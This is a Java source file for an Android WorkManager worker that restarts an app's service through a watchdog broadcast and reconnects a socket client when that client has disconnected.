package com.fason.app.worker;

import android.content.Context;
import android.content.Intent;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.receiver.WatchdogReceiver;

public class KeepAliveWorker extends Worker {
    public KeepAliveWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        if (WatchdogReceiver.isActive(getApplicationContext())) {
            respawnService();
            ensureSocket();
        }
        return Result.success();
    }

    private void respawnService() {
        try {
            Intent intent = new Intent(getApplicationContext(), WatchdogReceiver.class);
            intent.setAction(Protocol.BC_RESPAWN_SERVICE);
            getApplicationContext().sendBroadcast(intent);
        } catch (Exception ignored) {}
    }

    private void ensureSocket() {
        try {
            SocketClient client = SocketClient.getInstance();
            if (client.getSocket() != null && !client.getSocket().connected()) {
                client.reconnect();
            }
        } catch (Exception ignored) {}
    }
}
